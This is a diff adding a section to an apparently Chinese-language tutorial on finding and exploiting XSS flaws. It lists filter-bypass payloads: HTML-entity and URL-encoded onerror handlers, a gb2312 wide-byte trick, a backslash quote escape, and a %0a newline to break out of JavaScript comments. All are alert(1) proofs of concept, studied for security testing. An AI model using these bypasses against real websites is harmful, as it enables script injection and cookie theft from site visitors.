@@ -459,6 +459,55 @@ document.write(z)
 <script>with(document)alert(cookie)</script>
 ```
 
+**没有过滤&和#**
+
+
+```在 HTML 属性中，会自动对实体字符进行转义。一个简单的比方。
+<img src="1" onerror="alert(1)">
+和
+<img src="1" onerror="alert&#x28;1&#x29;">
+
+是等效的
+
+pyload
+<img src="1" onerror="alert&#x28;1&#x29;">
+还可以将上面pyload进行url编码
+<img src="1" onerror="alert%26%23x28%3b1%26%23x29%3b">
+```
+
+**宽字节绕过**
+
+```利用前提<meta>标签中有如下内容
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+
+pyload
+<img src="1%c0%22 onerror="alert%26%23x28%3b1%26%23x29%3b">
+```
+
+***反斜线绕过***
+
+```
+需要能够传两个参数，一个用反斜杠过滤双引号，一个用来写入js代码
+location.href="127.0.0.1/?"+"ss=aaaa\"+"&from==1;alert(1);function/**/from(){}//
+```
+
+***换行符绕过***
+```只有在注释中输出内容才能使用
+示例：
+//这是注释
+//这是注释{参数}
+{参数}=alert(1)
+//这是注释
+//这是注释alert(1)
+在注释中无法执行
+使用%0a用来跳过单行注释{参数}=%0alert(1)
+//这是注释
+//这是注释
+alert(1)
+利用换行在第二行注释中换了行，导致单行注释//没有注释到alert(1)
+```
+
+
 ## 查找利用存储型XSS
 
 确定保存型XSS漏洞的过程与前面描述的确定反射型XSS漏洞的过程类似。 
